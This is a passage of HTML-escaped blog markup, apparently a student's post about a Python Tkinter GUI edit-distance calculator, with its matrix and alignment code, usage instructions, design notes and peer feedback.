class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">#if the full edit check button is selected, output the full edit matrix</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"keyword\">self</span>.fulledit.get() == <span class=\"symbol\">TRUE:</span></span><br><span class=\"line\">            <span class=\"keyword\">self</span>.FD.insert(<span class=\"keyword\">END</span>, <span class=\"string\">'\\n--------------\\n'</span>)</span><br><span class=\"line\">            <span class=\"keyword\">self</span>.FD.insert(<span class=\"keyword\">END</span>, <span class=\"string\">' '</span> * <span class=\"keyword\">self</span>.maxlen * <span class=\"number\">2</span>)</span><br><span class=\"line\">            <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">0</span>,lent - <span class=\"number\">1</span>):</span><br><span class=\"line\">                <span class=\"keyword\">self</span>.FD.insert(<span class=\"keyword\">END</span>, T[i].ljust(<span class=\"keyword\">self</span>.maxlen))</span><br><span class=\"line\">            <span class=\"keyword\">self</span>.FD.insert(<span class=\"keyword\">END</span>, <span class=\"string\">'\\n'</span> + <span class=\"string\">' '</span> * <span class=\"keyword\">self</span>.maxlen)</span><br><span class=\"line\">            <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">0</span>,lens):</span><br><span class=\"line\">                <span class=\"keyword\">if</span> i != <span class=\"number\">0</span>:</span><br><span class=\"line\">                    <span class=\"keyword\">self</span>.FD.insert(<span class=\"keyword\">END</span>, S[i - <span class=\"number\">1</span>].ljust(<span class=\"keyword\">self</span>.maxlen))</span><br><span class=\"line\">                <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> range(<span class=\"number\">0</span>,lent):</span><br><span class=\"line\">                    <span class=\"keyword\">self</span>.FD.insert(<span class=\"keyword\">END</span>, str(dp[i][j]).ljust(<span class=\"keyword\">self</span>.maxlen))</span><br><span class=\"line\">                <span class=\"keyword\">self</span>.FD.insert(<span class=\"keyword\">END</span>, <span class=\"string\">'\\n'</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">#if hte alignment check box is selected, output the alignment</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"keyword\">self</span>.align.get() == <span class=\"symbol\">TRUE:</span></span><br><span class=\"line\">            <span class=\"keyword\">self</span>.AL.insert(<span class=\"keyword\">END</span>, <span class=\"string\">'\\n--------------\\n'</span>)</span><br><span class=\"line\">            j = lent - <span class=\"number\">1</span></span><br><span class=\"line\">            i = lens - <span class=\"number\">1</span></span><br><span class=\"line\">            res = []</span><br><span class=\"line\">            <span class=\"keyword\">while</span> <span class=\"symbol\">TRUE:</span></span><br><span class=\"line\">                <span class=\"comment\">#get the backtrack path</span></span><br><span class=\"line\">                res.append(bk[i][j])</span><br><span class=\"line\">                <span class=\"keyword\">if</span> bk[i][j] == <span class=\"string\">'\\\\'</span>:</span><br><span class=\"line\">                    i -= <span class=\"number\">1</span></span><br><span class=\"line\">                    j -= <span class=\"number\">1</span></span><br><span class=\"line\">                elif bk[i][j] == <span class=\"string\">'|'</span>:</span><br><span class=\"line\">                    i -= <span class=\"number\">1</span></span><br><span class=\"line\">                elif bk[i][j] == <span class=\"string\">'-'</span>:</span><br><span class=\"line\">                    j -= <span class=\"number\">1</span></span><br><span class=\"line\">                <span class=\"keyword\">if</span> i == <span class=\"number\">0</span> <span class=\"keyword\">and</span> j == <span class=\"number\">0</span>:</span><br><span class=\"line\">                    <span class=\"keyword\">break</span></span><br><span class=\"line\">            <span class=\"comment\">#reverse the backtrack path</span></span><br><span class=\"line\">            res.reverse()</span><br><span class=\"line\"></span><br><span class=\"line\">            i = j = k = <span class=\"number\">0</span></span><br><span class=\"line\">            <span class=\"comment\">#init the So, way and Ta list. which stores source, way, target information</span></span><br><span class=\"line\">            So = [<span class=\"string\">'a'</span>] * len(res)</span><br><span class=\"line\">            way = [<span class=\"string\">'a'</span>] * len(res)</span><br><span class=\"line\">            Ta = [<span class=\"string\">'a'</span>] * len(res)</span><br><span class=\"line\">            <span class=\"keyword\">for</span> p <span class=\"keyword\">in</span> range(len(res)):</span><br><span class=\"line\">                <span class=\"keyword\">if</span> res[p] == <span class=\"string\">'\\\\'</span>:</span><br><span class=\"line\">                    So[k] = S[i]</span><br><span class=\"line\">                    Ta[k] = T[j]</span><br><span class=\"line\">                    <span class=\"keyword\">if</span> S[i] == T[j]:</span><br><span class=\"line\">                        way[k] = <span class=\"string\">'|'</span></span><br><span class=\"line\">                    <span class=\"symbol\">else:</span></span><br><span class=\"line\">                        way[k] = <span class=\"string\">' '</span></span><br><span class=\"line\">                    i += <span class=\"number\">1</span></span><br><span class=\"line\">                    j += <span class=\"number\">1</span></span><br><span class=\"line\">                <span class=\"keyword\">if</span> res[p] == <span class=\"string\">'|'</span>:</span><br><span class=\"line\">                    So[k] = S[i]</span><br><span class=\"line\">                    Ta[k] = <span class=\"string\">'-'</span></span><br><span class=\"line\">                    way[k] = <span class=\"string\">' '</span></span><br><span class=\"line\">                    i += <span class=\"number\">1</span></span><br><span class=\"line\">                <span class=\"keyword\">if</span> res[p] == <span class=\"string\">'-'</span>:</span><br><span class=\"line\">                    So[k] = <span class=\"string\">'-'</span></span><br><span class=\"line\">                    Ta[k] = T[j]</span><br><span class=\"line\">                    way[k] = <span class=\"string\">' '</span></span><br><span class=\"line\">                    j += <span class=\"number\">1</span></span><br><span class=\"line\">                k += <span class=\"number\">1</span></span><br><span class=\"line\">            <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(len(res)):</span><br><span class=\"line\">                <span class=\"keyword\">self</span>.AL.insert(<span class=\"keyword\">END</span>, <span class=\"string\">' '</span> + So[i])</span><br><span class=\"line\">            <span class=\"keyword\">self</span>.AL.insert(<span class=\"keyword\">END</span>, <span class=\"string\">'\\n'</span>)</span><br><span class=\"line\">            <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(len(res)):</span><br><span class=\"line\">                <span class=\"keyword\">self</span>.AL.insert(<span class=\"keyword\">END</span>, <span class=\"string\">' '</span> + way[i])</span><br><span class=\"line\">            <span class=\"keyword\">self</span>.AL.insert(<span class=\"keyword\">END</span>, <span class=\"string\">'\\n'</span>)</span><br><span class=\"line\">            <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(len(res)):</span><br><span class=\"line\">                <span class=\"keyword\">self</span>.AL.insert(<span class=\"keyword\">END</span>, <span class=\"string\">' '</span> + Ta[i])</span><br><span class=\"line\">            <span class=\"keyword\">self</span>.AL.insert(<span class=\"keyword\">END</span>, <span class=\"string\">'\\n'</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">#this function is used to init the class</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">__init__</span><span class=\"params\">(<span class=\"keyword\">self</span>, master)</span></span>:</span><br><span class=\"line\">        Frame.__init_<span class=\"number\">_</span>(<span class=\"keyword\">self</span>,master)</span><br><span class=\"line\">        <span class=\"keyword\">self</span>.Sci = <span class=\"number\">1</span></span><br><span class=\"line\">        <span class=\"keyword\">self</span>.Scd = <span class=\"number\">1</span></span><br><span class=\"line\">        <span class=\"keyword\">self</span>.Scs = <span class=\"number\">1</span></span><br><span class=\"line\">        <span class=\"keyword\">self</span>.maxlen = <span class=\"number\">2</span></span><br><span class=\"line\">        <span class=\"keyword\">self</span>.pack()</span><br><span class=\"line\">        <span class=\"keyword\">self</span>.create()</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">#this function is used to change the range of step cost</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">changeRange</span><span class=\"params\">(<span class=\"keyword\">self</span>)</span></span>:</span><br><span class=\"line\">        <span class=\"keyword\">while</span>(TRUE):</span><br><span class=\"line\">            Range = askinteger(<span class=\"string\">\"Update the Range\"</span>,<span class=\"string\">\"Please input the range\"</span>)</span><br><span class=\"line\">            <span class=\"keyword\">if</span> Range &gt; <span class=\"number\">0</span>:</span><br><span class=\"line\">                <span class=\"keyword\">break</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> Range == <span class=\"symbol\">None:</span></span><br><span class=\"line\">                <span class=\"keyword\">break</span></span><br><span class=\"line\">        <span class=\"keyword\">self</span>.Scd.config(to = Range)</span><br><span class=\"line\">        <span class=\"keyword\">self</span>.Sci.config(to = Range)</span><br><span class=\"line\">        <span class=\"keyword\">self</span>.Scs.config(to = Range)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">#this function is used to show the menu bar</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">menu</span><span class=\"params\">(<span class=\"keyword\">self</span>)</span></span>:</span><br><span class=\"line\">        menu = Menu()</span><br><span class=\"line\">        <span class=\"keyword\">self</span>.master.config(menu = menu)</span><br><span class=\"line\">        option = Menu(menu)</span><br><span class=\"line\">        menu.add_cascade(label = <span class=\"string\">\"Option\"</span>, menu = option)</span><br><span class=\"line\">        option.add_command(label = <span class=\"string\">\"Range of modify cost\"</span>, command = <span class=\"keyword\">self</span>.changeRange)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">#this function is used to get the text boxes which appear at the bottom of the GUI</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">getOut</span><span class=\"params\">(<span class=\"keyword\">self</span>, name,father)</span></span>:</span><br><span class=\"line\">        <span class=\"keyword\">self</span>.frm = LabelFrame(father, text = name, padx = <span class=\"number\">10</span>, pady = <span class=\"number\">5</span>)</span><br><span class=\"line\">        lb = Text(<span class=\"keyword\">self</span>.frm, width = <span class=\"number\">30</span>, wrap = NONE)</span><br><span class=\"line\">        lb.config(font = (<span class=\"string\">\"Courier\"</span>, <span class=\"number\">10</span>))</span><br><span class=\"line\">        sl = Scrollbar(<span class=\"keyword\">self</span>.frm)</span><br><span class=\"line\">        sl.set(<span class=\"number\">0</span>.<span class=\"number\">5</span>,<span class=\"number\">1</span>)</span><br><span class=\"line\">        sl.pack(side = RIGHT, fill = Y)</span><br><span class=\"line\">        lb[<span class=\"string\">'yscrollcommand'</span>] = sl.set</span><br><span class=\"line\">        lb.pack(side = LEFT)</span><br><span class=\"line\">        sl[<span class=\"string\">'command'</span>] = lb.yview</span><br><span class=\"line\"></span><br><span class=\"line\">        sl = Scrollbar(<span class=\"keyword\">self</span>.frm, orient = HORIZONTAL)</span><br><span class=\"line\">        sl.set(<span class=\"number\">0</span>.<span class=\"number\">5</span>,<span class=\"number\">1</span>)</span><br><span class=\"line\">        sl.pack(fill = X)</span><br><span class=\"line\">        lb[<span class=\"string\">'xscrollcommand'</span>] = sl.set</span><br><span class=\"line\">        lb.pack(side = TOP)</span><br><span class=\"line\">        sl[<span class=\"string\">'command'</span>] = lb.xview</span><br><span class=\"line\">        <span class=\"keyword\">self</span>.frm.pack(side = LEFT)</span><br><span class=\"line\">        <span class=\"keyword\">return</span> lb</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">#read S and T from files</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">getFileS</span><span class=\"params\">(<span class=\"keyword\">self</span>)</span></span>:</span><br><span class=\"line\">        fd = askopenfilename()</span><br><span class=\"line\">        <span class=\"keyword\">if</span> fd == <span class=\"string\">\"\"</span>:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> </span><br><span class=\"line\">        tmpfile = open(fd,<span class=\"string\">\"r\"</span>)</span><br><span class=\"line\">        <span class=\"keyword\">self</span>.textS.delete(<span class=\"string\">\"1.0\"</span>, <span class=\"keyword\">END</span>)</span><br><span class=\"line\">        <span class=\"keyword\">self</span>.textS.insert(<span class=\"string\">\"1.0\"</span>, tmpfile.readline()[<span class=\"symbol\">:-</span><span class=\"number\">1</span>])</span><br><span class=\"line\">        tmpfile.close()</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">getFileT</span><span class=\"params\">(<span class=\"keyword\">self</span>)</span></span>:</span><br><span class=\"line\">        fd = askopenfilename()</span><br><span class=\"line\">        <span class=\"keyword\">if</span> fd == <span class=\"string\">\"\"</span>:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> </span><br><span class=\"line\">        tmpfile = open(fd,<span class=\"string\">\"r\"</span>)</span><br><span class=\"line\">        <span class=\"keyword\">self</span>.textT.delete(<span class=\"string\">\"1.0\"</span>, <span class=\"keyword\">END</span>)</span><br><span class=\"line\">        <span class=\"keyword\">self</span>.textT.insert(<span class=\"string\">\"1.0\"</span>, tmpfile.readline()[<span class=\"symbol\">:-</span><span class=\"number\">1</span>])</span><br><span class=\"line\">        tmpfile.close()</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">#main function to show the GUI</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">create</span><span class=\"params\">(<span class=\"keyword\">self</span>)</span></span>:</span><br><span class=\"line\">        <span class=\"keyword\">self</span>.menu()</span><br><span class=\"line\">        Input = LabelFrame(<span class=\"keyword\">self</span>, text = <span class=\"string\">\"Input\"</span>, padx = <span class=\"number\">10</span>, pady = <span class=\"number\">5</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">#input part</span></span><br><span class=\"line\">        frm_L = LabelFrame(Input, text = <span class=\"string\">\"Input S &amp; T\"</span>, padx = <span class=\"number\">10</span>, pady = <span class=\"number\">5</span>)</span><br><span class=\"line\">        </span><br><span class=\"line\">        <span class=\"comment\">#the S and T input part</span></span><br><span class=\"line\">        <span class=\"keyword\">self</span>.frm_LS = Frame(frm_L)</span><br><span class=\"line\">        Label(<span class=\"keyword\">self</span>.frm_LS, text = <span class=\"string\">\"S\"</span>, font = (<span class=\"string\">'Arial'</span>, <span class=\"number\">12</span>), padx = <span class=\"number\">10</span>).pack(side = LEFT)</span><br><span class=\"line\">        <span class=\"keyword\">self</span>.textS = Text(<span class=\"keyword\">self</span>.frm_LS,height = <span class=\"number\">3</span>, width = <span class=\"number\">18</span>, padx = <span class=\"number\">10</span>)</span><br><span class=\"line\">        <span class=\"keyword\">self</span>.textS.pack(side = LEFT)</span><br><span class=\"line\">        Button(<span class=\"keyword\">self</span>.frm_LS, text = <span class=\"string\">\"Open\"</span>, command = <span class=\"keyword\">self</span>.getFileS).pack(side = LEFT)</span><br><span class=\"line\">        <span class=\"keyword\">self</span>.frm_LS.pack(side = TOP)</span><br><span class=\"line\"></span><br><span class=\"line\">        frm_LT = Frame(frm_L)</span><br><span class=\"line\">        Label(frm_LT, text = <span class=\"string\">\"T\"</span>, font = (<span class=\"string\">'Arial'</span>, <span class=\"number\">12</span>), padx = <span class=\"number\">10</span>).pack(side = LEFT)</span><br><span class=\"line\">        <span class=\"keyword\">self</span>.textT = Text(frm_LT,height = <span class=\"number\">3</span>, width = <span class=\"number\">18</span>, padx = <span class=\"number\">10</span>)</span><br><span class=\"line\">        <span class=\"keyword\">self</span>.textT.pack(side = LEFT)</span><br><span class=\"line\">        Button(frm_LT, text = <span class=\"string\">\"Open\"</span>, command = <span class=\"keyword\">self</span>.getFileT).pack(side = LEFT)</span><br><span class=\"line\">        frm_LT.pack(side = TOP)</span><br><span class=\"line\"></span><br><span class=\"line\">        frm_L.pack(side = LEFT)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">#the distance input part</span></span><br><span class=\"line\">        frm_M = LabelFrame(Input, text = <span class=\"string\">\"Cost of modify\"</span>, padx = <span class=\"number\">10</span>, pady = <span class=\"number\">5</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">        frm_Mcd = Frame(frm_M)</span><br><span class=\"line\">        Label(frm_Mcd, text = <span class=\"string\">\"deletion\"</span>, font = (<span class=\"string\">'Arial'</span>, <span class=\"number\">11</span>), width = <span class=\"number\">10</span>).pack(side = LEFT)</span><br><span class=\"line\">        <span class=\"keyword\">self</span>.Scd = Scale(frm_Mcd, orient = HORIZONTAL, width = <span class=\"number\">10</span>, from<span class=\"number\">_</span> = <span class=\"number\">1</span>, to = <span class=\"number\">5</span>)</span><br><span class=\"line\">        <span class=\"keyword\">self</span>.Scd.pack(side = LEFT)</span><br><span class=\"line\">        frm_Mcd.pack(side = TOP)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">        frm_Mci = Frame(frm_M)</span><br><span class=\"line\">        Label(frm_Mci, text = <span class=\"string\">\"insertion\"</span>, font = (<span class=\"string\">'Arial'</span>, <span class=\"number\">11</span>), width = <span class=\"number\">10</span>).pack(side = LEFT)</span><br><span class=\"line\">        <span class=\"keyword\">self</span>.Sci = Scale(frm_Mci, orient = HORIZONTAL, width = <span class=\"number\">10</span>, from<span class=\"number\">_</span> = <span class=\"number\">1</span>, to = <span class=\"number\">5</span>)</span><br><span class=\"line\">        <span class=\"keyword\">self</span>.Sci.pack(side = LEFT)</span><br><span class=\"line\">        frm_Mci.pack(side = TOP)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">        frm_Mcs = Frame(frm_M)</span><br><span class=\"line\">        Label(frm_Mcs, text = <span class=\"string\">\"substitution\"</span>, font = (<span class=\"string\">'Arial'</span>, <span class=\"number\">11</span>), width = <span class=\"number\">10</span>).pack(side = LEFT)</span><br><span class=\"line\">        <span class=\"keyword\">self</span>.Scs = Scale(frm_Mcs, orient = HORIZONTAL, width = <span class=\"number\">10</span>, from<span class=\"number\">_</span> = <span class=\"number\">1</span>, to = <span class=\"number\">5</span>)</span><br><span class=\"line\">        <span class=\"keyword\">self</span>.Scs.pack(side = LEFT)</span><br><span class=\"line\">        frm_Mcs.pack(side = TOP)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">#the check box input part</span></span><br><span class=\"line\">        frm_R = LabelFrame(Input, text = <span class=\"string\">\"Pick the output\"</span>, padx = <span class=\"number\">10</span>, pady = <span class=\"number\">5</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">self</span>.fulledit = BooleanVar()</span><br><span class=\"line\">        Checkbutton(frm_R, text = <span class=\"string\">\"full edit\"</span>,height = <span class=\"number\">2</span>, width = <span class=\"number\">18</span>, anchor = W, variable = <span class=\"keyword\">self</span>.fulledit).pack(side = TOP, anchor = W)</span><br><span class=\"line\">        <span class=\"keyword\">self</span>.backtrack = BooleanVar()</span><br><span class=\"line\">        Checkbutton(frm_R, text = <span class=\"string\">\"backtrack matrix\"</span>, height = <span class=\"number\">2</span>, width = <span class=\"number\">18</span>, anchor = W, variable = <span class=\"keyword\">self</span>.backtrack).pack(side = TOP, anchor = W)</span><br><span class=\"line\">        <span class=\"keyword\">self</span>.align = BooleanVar()</span><br><span class=\"line\">        Checkbutton(frm_R, text = <span class=\"string\">\"alignment\"</span>, height = <span class=\"number\">2</span>, width = <span class=\"number\">18</span>, anchor = W, variable = <span class=\"keyword\">self</span>.align).pack(side = TOP, anchor = W)</span><br><span class=\"line\"></span><br><span class=\"line\">        convert = Frame(<span class=\"keyword\">self</span>)</span><br><span class=\"line\">        Button(convert, text = <span class=\"string\">\"Compare\"</span>, command = <span class=\"keyword\">self</span>.cal).pack()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">#this is the output part</span></span><br><span class=\"line\">        output = LabelFrame(<span class=\"keyword\">self</span>, text = <span class=\"string\">\"Output\"</span>, padx = <span class=\"number\">10</span>)</span><br><span class=\"line\">        Disfrm = Frame(output, padx = <span class=\"number\">10</span>, pady = <span class=\"number\">5</span>)</span><br><span class=\"line\">        Label(Disfrm, text = <span class=\"string\">\"Distance\"</span>, padx = <span class=\"number\">10</span>).pack(side = LEFT)</span><br><span class=\"line\">        <span class=\"keyword\">self</span>.Dis = Entry(Disfrm, width = <span class=\"number\">10</span>)</span><br><span class=\"line\">        <span class=\"keyword\">self</span>.Dis.pack(side = LEFT)</span><br><span class=\"line\">        Disfrm.pack(side = TOP)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">#get three textboxes which is the full edit, backtrack matrix and alignment text boxes</span></span><br><span class=\"line\">        <span class=\"keyword\">self</span>.FD = <span class=\"keyword\">self</span>.getOut(<span class=\"string\">\"full edit\"</span>, output)</span><br><span class=\"line\">        <span class=\"keyword\">self</span>.BM = <span class=\"keyword\">self</span>.getOut(<span class=\"string\">\"backtrack matrix\"</span>, output)</span><br><span class=\"line\">        <span class=\"keyword\">self</span>.AL = <span class=\"keyword\">self</span>.getOut(<span class=\"string\">\"alignment\"</span>, output)</span><br><span class=\"line\"></span><br><span class=\"line\">        frm_L.pack(side = LEFT)</span><br><span class=\"line\">        frm_M.pack(side = LEFT)</span><br><span class=\"line\">        frm_R.pack(side = LEFT)</span><br><span class=\"line\"></span><br><span class=\"line\">        Input.pack()</span><br><span class=\"line\">        convert.pack()</span><br><span class=\"line\">        output.pack()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name_<span class=\"number\">_</span> == <span class=\"string\">\"__main__\"</span>:</span><br><span class=\"line\">    root = Tk()</span><br><span class=\"line\">    root.title(<span class=\"string\">\"Distance Calculator\"</span>)</span><br><span class=\"line\">    root.geometry(<span class=\"string\">\"900x700\"</span>)</span><br><span class=\"line\">    root.resizable(width = True, height = True)</span><br><span class=\"line\"></span><br><span class=\"line\">    app = application(root)</span><br><span class=\"line\">    root.mainloop()</span><br></pre></td></tr></table></figure></p>\n","excerpt":"<p>Everyone want to calculate the distance between his Goddess and himself. This calculator can meet your need!<br>This is the first time that I use Python to generate a calculator.</p>\n<p>##AIM##<br>This program is used to get a GUI software for a edit distance calculator<br>","more":"</p>\n<p>##USAGE##</p>\n<ul>\n<li><strong>Use python to run</strong>: Use <em>python distance.py</em> to run this program</li>\n<li><strong>Input</strong>: The input part is located at the top of this GUI. <ul>\n<li>First is the input of S and T, which is the source string and the target string. The button behind the input box is used to choose a file to get the S and T. <strong>Attention that only the FIRST LINE of the selected file will be read into the input box</strong></li>\n<li>Second is the input of step cost of insertion, deletion and substitution a letter. <strong>The range of the input could be adjusted at the menu bar, under</strong> <em>Option</em> </li>\n<li>The part after that is the check boxes of output. Users can choose to show the full edit matrix, backtrack matrix and the alignment. </li>\n</ul>\n</li>\n<li><strong>Output</strong>: The output is located at the bottom of the GUI. It’s the distance, full edit matrix, backtrack matrix and the alignment.<br>##DESIGN##<br>The frame work of the design is shown below.<br><img src=\"/image/20151017design.jpg\" alt=\"\"><br>The blue boxes in Figure 1 is the frame I use. In order to align those boxes, I use many frames to get a better effect.<br>Figure 2 is my initial design<br><img src=\"/image/20151017hand.jpg\" alt=\"\"><br>##FEEDBACK##</li>\n<li><strong>Yi Hu</strong>: The GUI is neat and user-friendly. People without read me file can use it.</li>\n<li><strong>XinYang Zhang</strong>: This GUI looks compact and satisfies the requirements.</li>\n<li><strong>Robert Brotzman - smith</strong>: I think that is good. I would change the names of the strings to someting more meaningful as well as the operation names. Also maybe add names to the buttons to add files.<br>For Robert’s suggestion, I changed my strings to “deletion”, “insertion” and “substitution”. Which is used in the homework assignment. For the “add file”, I changed my “…” to “open”. Thank him.<br>##RUN CAPTURE##<br>Figure 3-6 is the screenshot of this software.<br><img src=\"/image/201510171.png\" alt=\"Figure 3\"><br><img src=\"/image/201510175.png\" alt=\"Figure 4\"><br><img src=\"/image/201510173.png\" alt=\"Figure 5\"><br><img src=\"/image/201510174.png\" alt=\"Figure 6\"></li>\n</ul>\n<p>##CODE##<br><figure class=\"highlight ruby\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br><span class=\"line\">186</span><br><span class=\"line\">187</span><br><span class=\"line\">188</span><br><span class=\"line\">189</span><br><span class=\"line\">190</span><br><span class=\"line\">191</span><br><span class=\"line\">192</span><br><span class=\"line\">193</span><br><span class=\"line\">194</span><br><span class=\"line\">195</span><br><span class=\"line\">196</span><br><span class=\"line\">197</span><br><span class=\"line\">198</span><br><span class=\"line\">199</span><br><span class=\"line\">200</span><br><span class=\"line\">201</span><br><span class=\"line\">202</span><br><span class=\"line\">203</span><br><span class=\"line\">204</span><br><span class=\"line\">205</span><br><span class=\"line\">206</span><br><span class=\"line\">207</span><br><span class=\"line\">208</span><br><span class=\"line\">209</span><br><span 